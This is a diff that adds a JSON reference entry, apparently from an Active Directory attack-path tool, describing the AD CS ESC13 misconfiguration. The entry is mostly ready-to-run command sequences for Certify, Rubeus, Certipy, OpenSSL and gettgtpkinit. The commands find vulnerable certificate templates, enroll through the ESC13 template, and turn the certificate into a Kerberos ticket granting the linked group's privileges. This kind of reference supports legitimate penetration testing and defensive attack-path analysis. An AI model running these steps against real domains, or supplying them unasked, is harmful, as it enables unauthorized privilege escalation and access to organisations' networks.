@@ -1,0 +1,95 @@
+{
+    "ADCSESC13": {
+        "meaning": "The principal has enrollment rights on a certificate template configured with an issuance policy extension. The issuance policy has an OID group link to an AD group. The principal also has enrollment permission for an enterprise CA with the necessary template published. This setup allows the principal to enroll a certificate that can be used to obtain access to the environment as a member of the group specified in the OID group link.",
+        "common": "",
+        "windows": {
+            "Certify_Rubeus": [
+                {
+                    "order": 1,
+                    "command": "Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC13\"",
+                    "description": "Request enrollment in certificate template with issuance policy extension"
+                },
+                {
+                    "order": 2,
+                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
+                    "description": "Convert emitted certificate to PFX format"
+                },
+                {
+                    "order": 3,
+                    "command": "Rubeus asktgt /user:attacker /domain:forestroot.com /certificate:cert.pfx /password:asdf /ptt",
+                    "description": "Request TGT using certificate with OID group link for group membership"
+                }
+            ],
+            "Certify_Simple": [
+                {
+                    "order": 1,
+                    "command": "Certify.exe find /vulnerable",
+                    "description": "Enumerate vulnerable certificate templates including ESC13"
+                },
+                {
+                    "order": 2,
+                    "command": "Certify.exe request /ca:CA_HOST\\CA_NAME /template:ESC13Template",
+                    "description": "Request certificate with issuance policy OID group link"
+                },
+                {
+                    "order": 3,
+                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
+                    "description": "Convert to PFX format"
+                },
+                {
+                    "order": 4,
+                    "command": "Rubeus.exe asktgt /certificate:cert.pfx /user:attacker /domain:domain.com /ptt",
+                    "description": "Authenticate with certificate to gain group membership privileges"
+                }
+            ]
+        },
+        "linux": {
+            "Certipy": [
+                {
+                    "order": 1,
+                    "command": "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC13",
+                    "description": "Request enrollment in certificate template with issuance policy extension"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy auth -pfx john.pfx -dc-ip 172.16.126.128",
+                    "description": "Request TGT using certificate with OID group link for group membership"
+                }
+            ],
+            "Certipy_Advanced": [
+                {
+                    "order": 1,
+                    "command": "certipy find -u user@domain.com -p password -target ca.domain.com",
+                    "description": "Enumerate certificate templates and identify ESC13 vulnerable templates"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy req -u user@domain.com -p password -ca CA-NAME -target ca.domain.com -template ESC13Template",
+                    "description": "Request certificate with issuance policy OID group link"
+                },
+                {
+                    "order": 3,
+                    "command": "certipy auth -pfx user.pfx -dc-ip DC_IP -username user -domain domain.com",
+                    "description": "Authenticate using certificate to obtain group membership privileges"
+                }
+            ],
+            "Manual_OpenSSL": [
+                {
+                    "order": 1,
+                    "command": "openssl req -new -key private.key -out request.csr -subj \"/CN=user\" -config openssl.conf",
+                    "description": "Create certificate request for template with issuance policy"
+                },
+                {
+                    "order": 2,
+                    "command": "# Submit CSR to CA with ESC13 template configured with OID group link",
+                    "description": "Submit certificate signing request to certificate authority"
+                },
+                {
+                    "order": 3,
+                    "command": "python3 gettgtpkinit.py domain.com/user -cert-pfx user.pfx -pfx-pass password -dc-ip DC_IP",
+                    "description": "Use certificate for PKINIT authentication with group membership"
+                }
+            ]
+        }
+    }
+}
